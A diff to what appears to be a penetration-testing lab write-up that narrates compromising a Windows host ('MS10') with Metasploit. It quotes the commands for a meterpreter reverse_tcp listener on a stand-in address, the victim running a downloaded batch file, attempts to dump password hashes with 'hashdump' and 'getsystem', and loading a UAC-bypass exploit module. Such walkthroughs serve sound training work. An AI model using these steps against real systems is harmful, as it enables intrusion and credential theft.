@@ -26,7 +26,9 @@ Next, I changed the MSF prompt to a handler for reverse shell payloads with the 
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/b8291d92-cd56-40f7-b7ee-794163bd0e35)
 
-Below, I used the commands "set payload windows/x64/meterpreter/reverse_tcp" and "set LHOST 203.0.113.66" to update the configurations to reflect the payload I will utilize and the host. I re-entered the "show options" command to reveal the updates I made. Once the correct configuration was input, I initiated the MSFConsole as the listener by entering "run". The MSFConsole is now listening on the host 203.0.113.66 on port 4444 for any connections.
+Below, I used the commands "set payload windows/x64/meterpreter/reverse_tcp" and "set LHOST 203.0.113.66" to update the configurations to reflect the payload I will utilize and the host. The x64 architecture version is used because the MS10 system is a 64-bit operating system. More relaible results occur when the architecture of the exploit and the OS match. 
+
+I re-entered the "show options" command to reveal the updates I made. Once the correct configuration was input, I initiated the MSFConsole as the listener by entering "run". The MSFConsole is now listening on the host 203.0.113.66 on port 4444 for any connections.
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/cc92f829-fd31-40ea-b41c-9d433a6a10aa)
 
@@ -75,15 +77,29 @@ Downloading the batch file caused the below command prompt to open, displaying t
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/b8b53073-7666-4ce2-afcc-84719bd5b36b)
 
+I returned to the Kali Terminal Window to reveal the session opened between the attack system and Jaime's system.
+
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/3e7ce2ef-4d3f-43ae-8664-30071b9b8dc4)
 
 **<p style="font-size: 15px;">Step 4: Take advantage of the exploited victim.</p>**
 
+In the terminal I entered "sysinfo" to view the details of Jaime's compromised system. Here we can see the computer name, MS10, Operating System, Windows 2016, Archetiecture, X64 and more. Next, I entered "getuid" to view the user account that created the remote sessions, Jaime.
+
+I then tried a command to see if I currently had enough privileges to steal password hashes. This commands was "hashdump". As you can see the error *priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect* appears next indicating the command was not successful. I needed to escalate my privileges within the system to gain access to the passwords and entered "getsystem" to attempt a privilege escalation to SYSTEM privileges. This also resulted in a failure, several lines appear to denote what was attempted and failed. 
+
+Due to these failures, I needed to perform an additional exploit against the system to gain additional capabilities. First, I needed to leave the connected session, but keep it preserved so that I could return later. To do this I entered the command "background".
+
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/37cf91b5-5adb-4ae0-a427-c2af5a0783bc)
+
+I entered, "use exploit/windows/local/bypassuac_silentcleanup" to utilize an exploit module used to bypass User Access Control on Windows Systems. The *local* path element indicates this exploit must be run from the victim's local system instead of remotely or externally exploited.
+
+"info" was entered next to display the information of the current exploit.
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/091b0a44-cf32-4b50-a513-c98ef0322f37)
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/50cb209c-8fe3-47f9-9a40-aac8d3c066b8)
+
+Next, I entered "show options" to check the host and port for the current session.
 
 ![image](https://github.com/kvweldon/Penetrating-an-Internal-Network/assets/141193154/2b2eca48-9dcb-43ed-a626-fd7e6f0dac6d)
 
